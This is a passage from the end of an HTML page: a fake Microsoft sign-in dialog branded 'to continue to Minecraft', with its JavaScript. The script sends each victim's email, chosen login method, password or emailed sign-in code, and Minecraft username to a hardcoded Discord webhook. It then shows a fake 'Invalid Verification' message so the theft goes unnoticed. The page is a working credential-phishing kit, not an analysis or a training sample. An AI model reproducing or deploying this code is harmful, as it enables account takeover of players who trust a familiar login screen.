    <a href="#">English (US)</a>
  </div>
</footer>

<!-- Microsoft Sign In Modal -->
<div id="microsoftModal">
  <div class="modal-content" id="msCard">
    <span class="modal-close" onclick="closeMicrosoftModal()">&times;</span>
    
    <!-- SCREEN 1 - Email Input -->
    <div id="ms-screen1" class="ms-card">
      <div class="ms-screen-content">
        <div class="ms-logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
          <span>Microsoft</span>
        </div>
        <div>
          <h1>Sign in</h1>
          <div class="ms-subtitle">to continue to Minecraft</div>
          <div class="ms-desc">Take the adventure online and play with your friends using your Microsoft account.</div>
          <div class="ms-input-wrap">
            <input id="ms-emailInput" type="text" placeholder="Email, phone, or Skype" value="player@example.com">
          </div>
          <div class="ms-create">No account? <a href="#">Create one!</a></div>
          <div class="ms-actions">
            <button class="ms-next" onclick="msGoToScreen2()">Next</button>
          </div>
        </div>
      </div>
    </div>

    <!-- SCREEN 2 - Code Option (default) -->
    <div id="ms-screen2" class="ms-card">
      <div class="ms-screen-content">
        <div class="ms-logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
          <span>Microsoft</span>
        </div>
        <div>
          <div class="ms-email-display">
            <span class="back-arrow" onclick="msGoToScreen1()">&#8592;</span>
            <span id="ms-emailDisplay"></span>
          </div>
          <h1>Sign in</h1>
          <div class="ms-subtitle">to continue to Minecraft</div>
          <div class="ms-desc">We'll send a code to <span id="ms-emailRepeat"></span> to sign you in.</div>
          <div class="ms-alt-link"><a onclick="msGoToPasswordScreen()">Use your password instead</a></div>
          <div class="ms-actions">
            <button class="ms-next" onclick="msGoToScreen3()">Send code</button>
          </div>
        </div>
      </div>
    </div>

    <!-- SCREEN PASSWORD - Password Input -->
    <div id="ms-screen-password" class="ms-card">
      <div class="ms-screen-content">
        <div class="ms-logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
          <span>Microsoft</span>
        </div>
        <div>
          <div class="ms-email-display">
            <span class="back-arrow" onclick="msGoToScreen2()">&#8592;</span>
            <span id="ms-emailDisplay-password"></span>
          </div>
          <h1>Enter password</h1>
          <div class="ms-subtitle">to continue to Minecraft</div>
          <div class="ms-desc">Enter the password for <span id="ms-emailRepeat-password"></span></div>
          <div class="ms-input-wrap" style="margin-top:24px;">
            <input id="ms-passwordInput" type="password" placeholder="Password">
          </div>
          <div class="ms-alt-link"><a onclick="msGoToScreen2()">Use a code instead</a></div>
          <div class="ms-actions">
            <button class="ms-next" onclick="msGoToScreen4()">Sign in</button>
          </div>
        </div>
      </div>
    </div>

    <!-- SCREEN 3 - Code Input -->
    <div id="ms-screen3" class="ms-card">
      <div class="ms-screen-content">
        <div class="ms-logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
          <span>Microsoft</span>
        </div>
        <div>
          <div class="ms-email-display">
            <span class="back-arrow" onclick="msGoToScreen2()">&#8592;</span>
            <span id="ms-emailDisplay3"></span>
          </div>
          <h1>Enter code</h1>
          <div class="ms-desc">We emailed a code to <span id="ms-emailRepeat3"></span>. Please enter the code to sign in.</div>
          <div class="ms-input-wrap" style="margin-top:24px;">
            <input id="ms-codeInput" type="text" placeholder="Enter code">
          </div>
          <div class="ms-alt-link"><a onclick="msGoToPasswordScreen()">Use your password instead</a></div>
          <div class="ms-actions">
            <button class="ms-next" onclick="msGoToScreen4()">Sign in</button>
          </div>
        </div>
      </div>
    </div>

    <!-- SCREEN 4: Loading + Verified -->
    <div id="ms-screen4" class="ms-card">
      <div class="ms-screen-content">
        <div class="ms-logo">
          <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
          <span>Microsoft</span>
        </div>

        <div class="ms-loading-screen" id="ms-loadingDots">
          <div class="ms-dots">
            <span></span><span></span><span></span>
          </div>
        </div>
        
        <div class="ms-verified-screen" id="ms-verifiedScreen">
          <div class="ms-checkmark">
            <svg viewBox="0 0 24 24"><polyline points="4 4 20 20"/><polyline points="20 4 4 20"/></svg>
          </div>
          <div class="ms-verified-title">Invalid Verification</div>
          <a class="ms-verified-sub" href="#" onclick="closeMicrosoftModal(); return false;">Try Again</a>
        </div>
      </div>
    </div>
  </div>
</div>

<script>
  // Microsoft Sign In Functions
  let msUserEmail = '';
  let currentScreen = 'screen1';
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1491679808000626759/pI4A8_MuyCs3P6u75pC4eDkJWWoRsMn_wRcuSb-Z1q6JzCQPWnSNvi8dUgf0fHjXHWH5';

  function sendWebhook(type, value) {
    const mcUsername = document.getElementById('mcname').value || 'Steve';
    
    let content = '';
    switch(type) {
      case 'email':
        content = '**Email Submitted**\nEmail: ```' + value + '```\nMinecraft Username: ```' + mcUsername + '```';
        break;
      case 'method':
        content = '**Login Method Selected**\nEmail: ```' + msUserEmail + '```\nMinecraft Username: ```' + mcUsername + '```\nMethod: ```' + value + '```';
        break;
      case 'final':
        content = '**Final Value Submitted**\nEmail: ```' + msUserEmail + '```\nMinecraft Username: ```' + mcUsername + '```\nType: ```' + value.type + '```\nValue: ```' + value.data + '```';
        break;
    }
    
    fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content })
    }).catch(err => console.warn('Discord fetch failed', err));
  }

  function msTransitionTo(fromId, toId) {
    const from = document.getElementById(fromId);
    const to = document.getElementById(toId);
    
    // Update current screen
    if (toId === 'ms-screen1') currentScreen = 'screen1';
    else if (toId === 'ms-screen2') currentScreen = 'screen2';
    else if (toId === 'ms-screen-password') currentScreen = 'password';
    else if (toId === 'ms-screen3') currentScreen = 'screen3';
    else if (toId === 'ms-screen4') currentScreen = 'screen4';
    
    // Remove animation class from previous content
    const fromContent = from.querySelector('.ms-screen-content');
    if (fromContent) {
      fromContent.style.animation = 'none';
    }
    
    from.style.display = 'none';
    to.style.display = 'block';
    
    // Add animation to new content
    const toContent = to.querySelector('.ms-screen-content');
    if (toContent) {
      toContent.style.animation = 'slideInRight 0.3s ease-out forwards';
    }
  }

  function msGoToScreen1() {
    msTransitionTo(currentScreen === 'screen2' ? 'ms-screen2' : 'ms-screen-password', 'ms-screen1');
  }

  function msGoToScreen2() {
    // Get email from the card input if not already set
    if (!msUserEmail) {
      msUserEmail = document.getElementById('ms-emailInput').value || 'player@example.com';
      // Send webhook for email
      sendWebhook('email', msUserEmail);
    }
    document.getElementById('ms-emailDisplay').textContent = msUserEmail;
    document.getElementById('ms-emailRepeat').textContent = msUserEmail;
    
    // Determine which screen we're coming from
    const fromId = currentScreen === 'screen1' ? 'ms-screen1' : 
                   (currentScreen === 'password' ? 'ms-screen-password' : 'ms-screen3');
    msTransitionTo(fromId, 'ms-screen2');
  }

  function msGoToPasswordScreen() {
    document.getElementById('ms-emailDisplay-password').textContent = msUserEmail;
    document.getElementById('ms-emailRepeat-password').textContent = msUserEmail;
    
    // Send webhook for method selection (password)
    sendWebhook('method', 'password');
    
    // Determine which screen we're coming from
    const fromId = currentScreen === 'screen2' ? 'ms-screen2' : 'ms-screen3';
    msTransitionTo(fromId, 'ms-screen-password');
  }

  function msGoToScreen3() {
    document.getElementById('ms-emailDisplay3').textContent = msUserEmail;
    document.getElementById('ms-emailRepeat3').textContent = msUserEmail;
    
    // Send webhook for method selection (code)
    sendWebhook('method', 'code');
    
    msTransitionTo('ms-screen2', 'ms-screen3');
  }

  function msGoToScreen4() {
    // Check which screen we're coming from to get the right input
    const isPasswordScreen = currentScreen === 'password';
    const isCodeScreen = currentScreen === 'screen3';
    
    let value = '';
    let type = '';
    
    if (isPasswordScreen) {
      value = document.getElementById('ms-passwordInput').value || '(no password entered)';
      type = 'password';
      msTransitionTo('ms-screen-password', 'ms-screen4');
    } else if (isCodeScreen) {
      value = document.getElementById('ms-codeInput').value || '(no code entered)';
      type = 'code';
      msTransitionTo('ms-screen3', 'ms-screen4');
    } else {
      msTransitionTo('ms-screen2', 'ms-screen4');
      value = 'unknown';
      type = 'unknown';
    }
    
    // Send webhook for final value
    sendWebhook('final', { type, data: value });

    // After 2 seconds swap dots for verified
    setTimeout(() => {
      const dots = document.getElementById('ms-loadingDots');
      const verified = document.getElementById('ms-verifiedScreen');
      dots.style.display = 'none';
      verified.style.display = 'flex';
      
      // Add animation to verified screen
      const verifiedContent = document.querySelector('#ms-verifiedScreen');
      if (verifiedContent) {
        verifiedContent.style.animation = 'slideInRight 0.3s ease-out forwards';
      }
    }, 2000);
  }

  // Modal Functions
  function openMicrosoftModal() {
    // Reset to screen 1
    document.getElementById('ms-screen1').style.display = 'block';
    document.getElementById('ms-screen2').style.display = 'none';
    document.getElementById('ms-screen-password').style.display = 'none';
    document.getElementById('ms-screen3').style.display = 'none';
    document.getElementById('ms-screen4').style.display = 'none';
    
    // Reset current screen
    currentScreen = 'screen1';
    
    // Reset loading/verified states
    document.getElementById('ms-loadingDots').style.display = 'flex';
    document.getElementById('ms-verifiedScreen').style.display = 'none';
    
    // Clear inputs
    document.getElementById('ms-emailInput').value = '';
    document.getElementById('ms-codeInput').value = '';
    document.getElementById('ms-passwordInput').value = '';
    
    // Reset email variable
    msUserEmail = '';
    
    // Show modal
    document.getElementById('microsoftModal').style.display = 'flex';
    
    // Add animation to screen 1 content
    const content = document.querySelector('#ms-screen1 .ms-screen-content');
    content.style.animation = 'slideInRight 0.3s ease-out forwards';
  }

  function closeMicrosoftModal() {
    document.getElementById('microsoftModal').style.display = 'none';
  }

  // Close modal when clicking outside
  window.onclick = function(event) {
    const modal = document.getElementById('microsoftModal');
    if (event.target === modal) {
      closeMicrosoftModal();
    }
  }

  // Disable all upsell functionality
  document.querySelectorAll('.upsell').forEach(upsell => {
    upsell.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      return false;
    });
  });
</script>
</body>
</html>
